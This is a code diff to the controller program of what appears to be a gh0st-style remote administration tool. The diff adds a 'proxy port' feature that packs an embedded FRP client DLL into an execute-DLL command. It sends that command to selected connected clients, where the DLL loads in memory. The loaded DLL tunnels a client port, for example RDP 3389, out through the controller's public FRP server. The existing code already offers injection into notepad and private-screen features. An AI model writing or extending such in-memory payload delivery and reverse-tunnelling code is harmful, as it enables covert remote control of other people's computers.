@@ -55,6 +55,7 @@
 #define TIMER_CLOSEWND 2
 #define TODO_NOTICE MessageBoxA("This feature has not been implemented!\nPlease contact: 962914132@qq.com", "提示", MB_ICONINFORMATION);
 #define TINY_DLL_NAME "TinyRun.dll"
+#define FRPC_DLL_NAME "Frpc.dll"
 
 typedef struct {
     const char*   szTitle;     //列表的名称
@@ -324,6 +325,26 @@ DllInfo* ReadTinyRunDll(int pid)
     return new DllInfo{ name, buf };
 }
 
+DllInfo* ReadFrpcDll()
+{
+	std::string name = FRPC_DLL_NAME;
+	DWORD fileSize = 0;
+	BYTE* dllData = ReadResource(IDR_BINARY_FRPC, fileSize);
+	// 设置输出参数
+	auto md5 = CalcMD5FromBytes(dllData, fileSize);
+	DllExecuteInfoNew info = { MEMORYDLL, fileSize, CALLTYPE_FRPC_CALL };
+	memcpy(info.Name, name.c_str(), name.length());
+	memcpy(info.Md5, md5.c_str(), md5.length());
+	BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfoNew) + fileSize];
+	buffer[0] = CMD_EXECUTE_DLL_NEW;
+	memcpy(buffer + 1, &info, sizeof(DllExecuteInfoNew));
+	memcpy(buffer + 1 + sizeof(DllExecuteInfoNew), dllData, fileSize);
+	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfoNew) + fileSize, 0, md5);
+	SAFE_DELETE_ARRAY(dllData);
+	SAFE_DELETE_ARRAY(buffer);
+	return new DllInfo{ name, buf };
+}
+
 std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath)
 {
     std::vector<DllInfo*> result;
@@ -421,6 +442,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
     m_bmOnline[16].LoadBitmap(IDB_BITMAP_PDESKTOP);
     m_bmOnline[17].LoadBitmap(IDB_BITMAP_REGROUP);
     m_bmOnline[18].LoadBitmap(IDB_BITMAP_INJECT);
+    m_bmOnline[19].LoadBitmap(IDB_BITMAP_PORTPROXY);
 
     for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
         m_ServerDLL[i] = nullptr;
@@ -579,7 +601,8 @@ BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
     ON_COMMAND(ID_ONLINE_INJ_NOTEPAD, &CMy2015RemoteDlg::OnOnlineInjNotepad)
     ON_COMMAND(ID_PARAM_LOGIN_NOTIFY, &CMy2015RemoteDlg::OnParamLoginNotify)
     ON_COMMAND(ID_PARAM_ENABLE_LOG, &CMy2015RemoteDlg::OnParamEnableLog)
-END_MESSAGE_MAP()
+        ON_COMMAND(ID_PROXY_PORT, &CMy2015RemoteDlg::OnProxyPort)
+        END_MESSAGE_MAP()
 
 
 // CMy2015RemoteDlg 消息处理程序
@@ -1672,6 +1695,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
     Menu.SetMenuItemBitmaps(ID_ONLINE_PRIVATE_SCREEN, MF_BYCOMMAND, &m_bmOnline[16], &m_bmOnline[16]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_REGROUP, MF_BYCOMMAND, &m_bmOnline[17], &m_bmOnline[17]);
     Menu.SetMenuItemBitmaps(ID_ONLINE_INJ_NOTEPAD, MF_BYCOMMAND, &m_bmOnline[18], &m_bmOnline[18]);
+    Menu.SetMenuItemBitmaps(ID_PROXY_PORT, MF_BYCOMMAND, &m_bmOnline[19], &m_bmOnline[19]);
 
     std::string masterHash(GetMasterHash());
     if (GetPwdHash() != masterHash) {
@@ -2420,6 +2444,7 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
         break;
     }
     case CMD_EXECUTE_DLL: { // 请求DLL（执行代码）【L】
+    case CMD_EXECUTE_DLL_NEW:
         DllExecuteInfo *info = (DllExecuteInfo*)ContextObject->InDeCompressedBuffer.GetBuffer(1);
         if (std::string(info->Name) == TINY_DLL_NAME) {
             auto tinyRun = ReadTinyRunDll(info->Pid);
@@ -2427,6 +2452,13 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
             ContextObject->Send2Client(buf->Buf(), tinyRun->Data->length());
             SAFE_DELETE(tinyRun);
             break;
+        }
+        else if (std::string(info->Name) == FRPC_DLL_NAME) {
+			auto frpc = ReadFrpcDll();
+			Buffer* buf = frpc->Data;
+			ContextObject->Send2Client(buf->Buf(), frpc->Data->length());
+			SAFE_DELETE(frpc);
+			break;
         }
         for (std::vector<DllInfo*>::const_iterator i=m_DllList.begin(); i!=m_DllList.end(); ++i) {
             DllInfo* dll = *i;
@@ -4350,4 +4382,123 @@ void CMy2015RemoteDlg::OnParamEnableLog()
     SubMenu->CheckMenuItem(ID_PARAM_ENABLE_LOG, m_settings.EnableLog ? MF_CHECKED : MF_UNCHECKED);
     THIS_CFG.SetInt("settings", "EnableLog", m_settings.EnableLog);
     SendMasterSettings(nullptr);
+}
+
+
+bool IsDateGreaterOrEqual(const char* date1, const char* date2)
+{
+	const char* months[] = {
+		"Jan", "Feb", "Mar", "Apr", "May", "Jun",
+		"Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
+	};
+
+	auto parseDate = [&months](const char* date, int& year, int& month, int& day) {
+		char mon[4] = { 0 };
+		sscanf(date, "%3s %d %d", mon, &day, &year);
+		month = 0;
+		for (int i = 0; i < 12; i++) {
+			if (strcmp(mon, months[i]) == 0) {
+				month = i + 1;
+				break;
+			}
+		}
+	};
+
+	int y1, m1, d1, y2, m2, d2;
+	parseDate(date1, y1, m1, d1);
+	parseDate(date2, y2, m2, d2);
+
+	if (y1 != y2) return y1 >= y2;
+	if (m1 != m2) return m1 >= m2;
+	return d1 >= d2;
+}
+
+#include <string>
+#include <cstdio>
+#include <windows.h>
+#include <wincrypt.h>
+
+#pragma comment(lib, "advapi32.lib")
+
+std::string GetAuthKey(const char* token, long long timestamp)
+{
+	char tsStr[32];
+	sprintf_s(tsStr, "%lld", timestamp);
+
+	HCRYPTPROV hProv = 0;
+	HCRYPTHASH hHash = 0;
+	std::string result;
+
+	if (CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
+	{
+		if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
+		{
+			CryptHashData(hHash, (BYTE*)token, (DWORD)strlen(token), 0);
+			CryptHashData(hHash, (BYTE*)tsStr, (DWORD)strlen(tsStr), 0);
+
+			BYTE hash[16];
+			DWORD cbHash = sizeof(hash);
+			if (CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0))
+			{
+				char hex[33];
+				for (int i = 0; i < 16; i++)
+					sprintf_s(hex + i * 2, 3, "%02x", hash[i]);
+				result = hex;
+			}
+			CryptDestroyHash(hHash);
+		}
+		CryptReleaseContext(hProv, 0);
+	}
+
+	return result;
+}
+
+// 基于FRP将客户端端口代理到主控程序的公网
+// 例如代理3389端口，即可通过 mstsc.exe 进行远程访问
+void CMy2015RemoteDlg::OnProxyPort()
+{
+    BOOL useFrp = THIS_CFG.GetInt("frp", "UseFrp", 0);
+    std::string pwd = THIS_CFG.GetStr("frp", "token", "");
+    std::string ip = THIS_CFG.GetStr("settings", "master", "");
+    if (!useFrp || pwd.empty() || ip.empty()) {
+        MessageBoxA("需要正确启用FRP反向代理方可使用此功能!", "提示", MB_ICONINFORMATION);
+        return;
+    }
+    CInputDialog dlg(this);
+    dlg.Init("代理端口", "请输入客户端端口:");
+	if (IDOK != dlg.DoModal() || atoi(dlg.m_str) <= 0 || atoi(dlg.m_str) >= 65536) {
+		return;
+	}
+    uint64_t timestamp = time(nullptr);
+    std::string key = GetAuthKey(pwd.c_str(), timestamp);
+	int serverPort = THIS_CFG.GetInt("frp", "server_port", 7000);
+    int localPort = atoi(dlg.m_str);
+	auto frpc = ReadFrpcDll();
+    FrpcParam param(key.c_str(), timestamp, ip.c_str(), serverPort, localPort, localPort);
+	EnterCriticalSection(&m_cs);
+	POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+	while (Pos) {
+		int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+		context* ctx = (context*)m_CList_Online.GetItemData(iItem);
+		if (!ctx->IsLogin())
+			continue;
+        CString date = ctx->GetClientData(ONLINELIST_VERSION);
+		if (IsDateGreaterOrEqual(date, "Dec 22 2025")) {
+			Buffer* buf = frpc->Data;
+            BYTE cmd[1 + sizeof(DllExecuteInfoNew)] = {0};
+            memcpy(cmd, buf->Buf(), 1 + sizeof(DllExecuteInfoNew));
+            DllExecuteInfoNew* p = (DllExecuteInfoNew*)(cmd + 1);
+            SetParameters(p, (char*)&param, sizeof(param));
+			ctx->Send2Client(cmd, 1 + sizeof(DllExecuteInfoNew));
+        }
+        else {
+            PostMessageA(WM_SHOWNOTIFY, (WPARAM)new CharMsg("版本不支持"), 
+                (LPARAM)new CharMsg("客户端版本最低要求: " + CString("Dec 22 2025")));
+        }
+        break;
+	}
+	LeaveCriticalSection(&m_cs);
+	SAFE_DELETE(frpc);
+    MessageBoxA(CString("请通过") + ip.c_str() + ":" + std::to_string(localPort).c_str() + "访问代理端口!", 
+        "提示", MB_ICONINFORMATION);
 }
